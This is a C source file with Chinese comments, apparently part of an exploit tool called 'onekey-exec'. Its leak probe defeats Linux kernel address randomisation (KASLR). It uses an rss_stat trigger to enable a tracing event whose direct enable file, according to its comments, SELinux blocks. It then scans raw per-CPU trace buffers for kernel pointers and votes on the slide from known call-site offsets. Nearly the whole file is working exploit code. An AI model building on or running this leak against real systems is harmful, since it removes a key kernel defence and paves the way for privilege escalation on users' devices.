/*
 * onekey-exec probe —— 只用公开 tracefs 接口推导 KASLR slide。
 *
 * 不解析 ring buffer 的记录布局（换内核就可能变），改用"假设检验"：
 *   1) 用 rss_stat 的 trigger 动作 enable_event 打开 kmem:kmem_cache_alloc
 *      （事件目录下的 enable 被 SELinux 拒写，trigger 可写）；
 *   2) 自己发起确定的系统调用，产生已知调用点（getname_flags+0x44 等）；
 *   3) 从 per_cpu/cpuN/trace_pipe_raw 扫所有 8 字节窗口；
 *   4) 对每个窗口和每个已知调用点假设 slide = v - (sym+off)，
 *      要求 2MB 对齐；得票最多、且至少两个不同调用点同票者即为真 slide。
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#define TR "/sys/kernel/tracing"
#define MAX_SYM 200000
#define MAX_VOTES 64

typedef struct { uint64_t addr; char name[64]; } sym_t;
static sym_t *syms;
static int nsyms;

static const struct { const char *name; unsigned off; } SEEDS[] = {
    {"getname_flags", 0x44},
    {"alloc_empty_file", 0x50},
    {"security_file_alloc", 0xfc},
};

static uint64_t now_ms(void) {
    struct timespec ts; clock_gettime(CLOCK_MONOTONIC, &ts);
    return (uint64_t)ts.tv_sec * 1000 + ts.tv_nsec / 1000000;
}

static int write_file(const char *path, const char *text) {
    int fd = open(path, O_WRONLY | O_CLOEXEC);
    if (fd < 0) return -errno;
    ssize_t n = write(fd, text, strlen(text));
    int e = errno; close(fd);
    return n < 0 ? -e : 0;
}

static int load_symbols(const char *path) {
    FILE *f = fopen(path, "re");
    if (!f) return -1;
    syms = calloc(MAX_SYM, sizeof(sym_t));
    char line[256]; int prev = -1;
    while (fgets(line, sizeof line, f) && nsyms < MAX_SYM) {
        unsigned long long a; char t; char name[160];
        if (sscanf(line, "%llx %c %159s", &a, &t, name) != 3) continue;
        (void)prev;
        syms[nsyms].addr = a;
        strncpy(syms[nsyms].name, name, sizeof syms[nsyms].name - 1);
        prev = nsyms++;
    }
    fclose(f);
    return nsyms > 0 ? 0 : -1;
}

static int sym_addr(const char *name, uint64_t *out) {
    for (int i = 0; i < nsyms; i++)
        if (strcmp(syms[i].name, name) == 0) { *out = syms[i].addr; return 1; }
    return 0;
}

/* 开放寻址哈希表：几百万窗口会产生大量不同 slide，固定数组会被瞬间打满 */
#define HASH_BITS 17
#define HASH_SIZE (1u << HASH_BITS)
typedef struct { uint64_t slide; uint64_t site; uint32_t votes; uint32_t seeds; uint8_t used; } vote_t;
static vote_t *table;

static void vote(uint64_t slide, int seed_id, uint64_t site) {
    uint32_t h = (uint32_t)((slide >> 21) * 2654435761u) & (HASH_SIZE - 1);
    for (uint32_t i = 0; i < HASH_SIZE; i++) {
        uint32_t idx = (h + i) & (HASH_SIZE - 1);
        if (!table[idx].used) {
            table[idx].used = 1; table[idx].slide = slide;
            if (!table[idx].site) table[idx].site = site;
            table[idx].votes = 1; table[idx].seeds = 1u << seed_id;
            return;
        }
        if (table[idx].slide == slide) {
            table[idx].votes++; table[idx].seeds |= 1u << seed_id;
            return;
        }
    }
}

int leak_probe(const char *symfile, int budget, int emit) {
    if (load_symbols(symfile) != 0) { printf("ERROR=leak symbols %s\n", symfile); return 2; }
    if (emit) printf("SYMS=%d\n", nsyms);

    uint64_t seed_addr[3]; int seed_cnt = 0;
    for (unsigned i = 0; i < sizeof SEEDS / sizeof SEEDS[0]; i++) {
        uint64_t a;
        if (sym_addr(SEEDS[i].name, &a)) seed_addr[seed_cnt++] = a + SEEDS[i].off;
        else if (emit) printf("MISS_SEED=%s\n", SEEDS[i].name);
    }
    if (!seed_cnt) { printf("ERROR=leak no-seeds\n"); return 3; }

    write_file(TR "/buffer_size_kb", "16384");
    write_file(TR "/tracing_on", "1");
    int trig = write_file(TR "/events/kmem/rss_stat/trigger", "enable_event:kmem:kmem_cache_alloc");
    if (trig != 0) { printf("ERROR=leak trigger %d\n", trig); return 4; }

    int fds[16], nfd = 0; char path[128];
    for (int cpu = 0; cpu < 16; cpu++) {
        snprintf(path, sizeof path, TR "/per_cpu/cpu%d/trace_pipe_raw", cpu);
        int fd = open(path, O_RDONLY | O_NONBLOCK | O_CLOEXEC);
        if (fd >= 0) fds[nfd++] = fd;
    }

    pid_t child = fork();
    if (child == 0) {
        char cwd[256]; uint64_t end = now_ms() + (uint64_t)budget * 1000;
        while (now_ms() < end) {
            for (int i = 0; i < 500; i++) { getcwd(cwd, sizeof cwd); close(open("/proc/self/stat", O_RDONLY)); }
            usleep(500);
        }
        _exit(0);
    }

    table = calloc(HASH_SIZE, sizeof(vote_t));
    uint8_t buf[65536];
    uint64_t deadline = now_ms() + (uint64_t)budget * 1000 + 2000;
    while (now_ms() < deadline) {
        int progressed = 0;
        for (int i = 0; i < nfd; i++) {
            ssize_t got = read(fds[i], buf, sizeof buf);
            if (got <= 0) continue;
            progressed = 1;
            for (ssize_t k = 16; k + 8 <= got; k += 4) {
                uint64_t v; memcpy(&v, buf + k, 8);
                if (v < 0xffffffc000000000ULL || v > 0xffffffff00000000ULL) continue;
                for (int s = 0; s < seed_cnt; s++) {
                    uint64_t d = v - seed_addr[s];
                    if (d > 0x10000000000ULL) continue;
                    if (d & 0x1fffffULL) continue;
                    vote(d, s, v);
                }
            }
        }
        if (!progressed) usleep(2000);
    }
    waitpid(child, NULL, 0);
    for (int i = 0; i < nfd; i++) close(fds[i]);
    write_file(TR "/events/kmem/rss_stat/trigger", "!enable_event:kmem:kmem_cache_alloc");
    write_file(TR "/tracing_on", "0");

    uint64_t best_slide = 0, best_site = 0; int best = 0, best_seeds = 0;
    for (uint32_t i = 0; i < HASH_SIZE; i++) {
        if (!table[i].used) continue;
        int nseeds = __builtin_popcount(table[i].seeds);
        if (nseeds >= 2 && table[i].votes > best) {
            best = table[i].votes; best_seeds = nseeds;
            best_slide = table[i].slide; best_site = table[i].site;
        }
    }
    free(table);
    if (best) {
        printf("SLIDE_OK=0x%llx seeds=%d votes=%d site=0x%llx\n",
               (unsigned long long)best_slide, best_seeds, best, (unsigned long long)best_site);
        return 0;
    }
    printf("ERROR=leak no-consensus\n");
    return 1;
}
